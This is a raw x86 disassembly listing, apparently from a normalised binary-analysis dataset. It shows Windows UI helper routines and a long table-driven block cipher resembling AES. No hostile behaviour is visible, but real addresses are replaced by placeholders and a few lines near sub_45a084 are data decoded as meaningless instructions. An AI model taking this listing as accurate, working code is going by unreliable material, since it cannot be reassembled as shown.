mov eax [ eax + 0x60 ]
call sub_43bbc8
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x24 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43bbc8
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x30 ]
call sub_43c2e8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0xc ]
lea edx [ ebp - 0x6d ]
mov esi [ eax ]
call [ esi + 0xe4 ]
call sub_456cec
mov eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0xc ]
call sub_4598e0
pop ecx
add eax 0x5
sub [ ebp - 0x6d ] eax
sub [ ebp - 0x65 ] eax
mov cl 0x1
mov edx [ ebp - 0x10 ]
mov eax [ ebx ]
call sub_4594b8
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4594b8
jmp r-xdata
sub_459d28
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov esi eax
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0xd0 ]
call sub_406248
cmp ebx eax
jl r-xdata
lea edi [ ebx + ebx * 2 ]
mov eax [ esi + 0xd0 ]
cmp ebp [ eax + edi * 4 + 0x4 ]
jne r-xdata
mov eax [ esi + 0xcc ]
mov [ esp ] eax
inc [ esi + 0xcc ]
mov eax [ esi + 0xd0 ]
call sub_406248
cmp ebx eax
jl r-xdata
mov eax [ esi + 0xd0 ]
cmp [ eax + edi * 4 ] 0xffffffff
je r-xdata
mov eax [ esi + 0xd0 ]
mov eax [ eax + edi * 4 ]
mov [ esp ] eax
jmp r-xdata
lea eax [ ebx + ebx * 2 ]
mov edx [ esi + 0xd0 ]
mov ecx [ esp ]
mov [ edx + eax * 4 ] ecx
mov edx [ esi + 0xd0 ]
mov [ edx + eax * 4 + 0x4 ] ebp
mov edx [ esi + 0xd0 ]
cmp [ ebp + 0x344 ] 0x0
setne cl
mov [ edx + eax * 4 + 0x8 ] cl
mov eax [ esi + 0xd0 ]
call sub_406248
mov ebx eax
lea eax [ ebx + 0x1 ]
push eax
lea eax [ esi + 0xd0 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
inc ebx
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_459df0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_404e98
cmp [ ebx + 0x284 ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x284 ]
call sub_404e98
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_459e2c
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
cmp [ ebx + 0xf2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov edx esp
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
cmp [ esp ] 0x0
jne r-xdata
call GetActiveWindow
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call GetLastActivePopup
mov [ esp ] eax
sub_459e74
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
cmp [ ebx + 0xfa ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov edx esp
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
mov eax [ esp ]
pop edx
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax [ ebx + 0x44 ]
call sub_443be8
mov [ esp ] eax
sub_459eb4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_43d400
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_43d400
dec eax
je r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44bd80
sub_459f4c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xda ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_459f74
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xe2 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45a018
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
xor ebx ebx
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ edi ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov eax ebp
call sub_438b98
mov esi eax
test esi esi
jne r-xdata
cmp ebp [ eax + 0x29c ]
jne r-xdata
test esi esi
je r-xdata
push ebp
call GetParent
mov ebp eax
test ebp ebp
je r-xdata
mov esi eax
jmp r-xdata
mov edx edi
mov eax esi
mov si 0xffb1
call sub_404160
mov ebx eax
mov eax ebp
call sub_438b98
mov esi eax
test esi esi
je r-xdata
sub_45a084
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
xchg [ edx ] cl
add [ esi + 0x43 ] 0x0
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45a0e7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a0ee
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_44e2d0
mov eax sub_44e560
call sub_4162f4
mov eax [ rw-data ]
push eax
call CloseHandle
sub_45a168
push ebx
push esi
push edi
add esp 0xfffffff4
mov ecx [ eax ]
mov [ edx ] ecx
lea ecx [ eax + 0x4 ]
mov ecx [ ecx ]
mov [ edx + 0x4 ] ecx
lea ecx [ eax + 0x8 ]
mov ecx [ ecx ]
mov [ edx + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov ecx [ ecx ]
mov [ edx + 0xc ] ecx
lea ecx [ eax + 0x10 ]
mov ecx [ ecx ]
mov [ edx + 0x10 ] ecx
lea ecx [ eax + 0x14 ]
mov ecx [ ecx ]
mov [ edx + 0x14 ] ecx
lea ecx [ eax + 0x18 ]
mov ecx [ ecx ]
mov [ edx + 0x18 ] ecx
add eax 0x1c
mov eax [ eax ]
mov [ edx + 0x1c ] eax
xor eax eax
mov [ esp ] 0x1
mov ecx [ edx + eax * 4 + 0x1c ]
mov edi ecx
shl edi 0x18
shr ecx 0x8
or edi ecx
mov ecx edi
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov [ esp + 0x4 ] ecx
mov ecx edi
shr ecx 0x8
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx edi
shr ebx 0x10
movzx ebx bl
mov esi [ ebx * 4 + rw-data ]
mov ebx edi
shr ebx 0x18
movzx ebx bl
mov ebx [ ebx * 4 + rw-data ]
mov [ esp + 0x8 ] ebx
mov ebx ecx
shl ebx 0x8
shr ecx 0x18
or ebx ecx
xor ebx [ esp + 0x4 ]
mov ecx esi
shl ecx 0x10
shr esi 0x10
or ecx esi
xor ebx ecx
mov ecx [ esp + 0x8 ]
shl ecx 0x18
mov esi [ esp + 0x8 ]
shr esi 0x8
or ecx esi
xor ebx ecx
xor ebx [ edx + eax * 4 ]
mov ecx [ esp ]
xor ebx [ ecx * 4 + rw-data ]
mov [ edx + eax * 4 + 0x20 ] ebx
inc [ esp ]
mov ecx [ edx + eax * 4 + 0x4 ]
xor ecx [ edx + eax * 4 + 0x20 ]
mov [ edx + eax * 4 + 0x24 ] ecx
mov ebx [ edx + eax * 4 + 0x8 ]
xor ebx ecx
mov [ edx + eax * 4 + 0x28 ] ebx
mov edi [ edx + eax * 4 + 0xc ]
xor edi ebx
mov [ edx + eax * 4 + 0x2c ] edi
movzx ecx [ edx + eax * 4 + 0x2c ]
mov ecx [ ecx * 4 + rw-data ]
mov [ esp + 0x4 ] ecx
mov ecx edi
shr ecx 0x8
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx edi
shr ebx 0x10
movzx ebx bl
mov esi [ ebx * 4 + rw-data ]
mov ebx edi
shr ebx 0x18
movzx ebx bl
mov ebx [ ebx * 4 + rw-data ]
mov [ esp + 0x8 ] ebx
mov ebx ecx
shl ebx 0x8
shr ecx 0x18
or ebx ecx
xor ebx [ esp + 0x4 ]
mov ecx esi
shl ecx 0x10
shr esi 0x10
or ecx esi
xor ebx ecx
mov ecx [ esp + 0x8 ]
shl ecx 0x18
mov esi [ esp + 0x8 ]
shr esi 0x8
or ecx esi
xor ebx ecx
xor ebx [ edx + eax * 4 + 0x10 ]
mov [ edx + eax * 4 + 0x30 ] ebx
mov ecx [ edx + eax * 4 + 0x14 ]
xor ecx [ edx + eax * 4 + 0x30 ]
mov [ edx + eax * 4 + 0x34 ] ecx
mov ebx [ edx + eax * 4 + 0x18 ]
xor ebx ecx
mov [ edx + eax * 4 + 0x38 ] ebx
mov ecx [ edx + eax * 4 + 0x1c ]
xor ecx ebx
mov [ edx + eax * 4 + 0x3c ] ecx
add eax 0x8
cmp eax 0x34
jl r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_45a30c
push ebx
push esi
add esp 0xffffffd8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx [ eax ]
mov ecx [ esp ]
xor edx [ ecx ]
mov [ esp + 0x8 ] edx
lea edx [ eax + 0x4 ]
mov edx [ edx ]
mov ecx [ esp ]
xor edx [ ecx + 0x4 ]
mov [ esp + 0xc ] edx
lea edx [ eax + 0x8 ]
mov edx [ edx ]
mov ecx [ esp ]
xor edx [ ecx + 0x8 ]
mov [ esp + 0x10 ] edx
add eax 0xc
mov eax [ eax ]
mov edx [ esp ]
xor eax [ edx + 0xc ]
mov [ esp + 0x14 ] eax
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x10 ]
mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x14 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x18 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x1c ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x20 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x24 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x28 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x2c ]
mov [ esp + 0x14 ] edx
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x30 ]
mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x34 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x38 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x3c ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x40 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x44 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x48 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x4c ]
mov [ esp + 0x14 ] edx
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x50 ]
mov [ esp + 0x18 ] edx
movzx eax [ esp + 0xc ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x10 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x54 ]
mov [ esp + 0x1c ] edx
movzx eax [ esp + 0x10 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x14 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x8 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x58 ]
mov [ esp + 0x20 ] edx
movzx eax [ esp + 0x14 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x8 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0xc ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x5c ]
mov [ esp + 0x24 ] edx
movzx eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x1c ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x60 ]
mov [ esp + 0x8 ] edx
movzx eax [ esp + 0x1c ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x20 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x24 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x64 ]
mov [ esp + 0xc ] edx
movzx eax [ esp + 0x20 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x24 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x18 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x68 ]
mov [ esp + 0x10 ] edx
movzx eax [ esp + 0x24 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0x18 ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x1c ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x20 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x6c ]
mov [ esp + 0x14 ] edx
movzx eax [ esp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ esp + 0xc ]
shr eax 0x8
movzx eax al
mov eax [ eax * 4 + rw-data ]
mov ecx [ esp + 0x10 ]
shr ecx 0x10
movzx ecx cl
mov esi [ ecx * 4 + rw-data ]
mov ecx [ esp + 0x14 ]
shr ecx 0x18
movzx ecx cl
mov ecx [ ecx * 4 + rw-data ]
mov ebx eax
shl ebx 0x8
shr eax 0x18
or ebx eax
xor edx ebx
mov eax esi
shl eax 0x10
shr esi 0x10
or eax esi
xor edx eax
mov eax ecx
shl eax 0x18
shr ecx 0x8
or eax ecx
xor edx eax
mov eax [ esp ]
xor edx [ eax + 0x70 ]
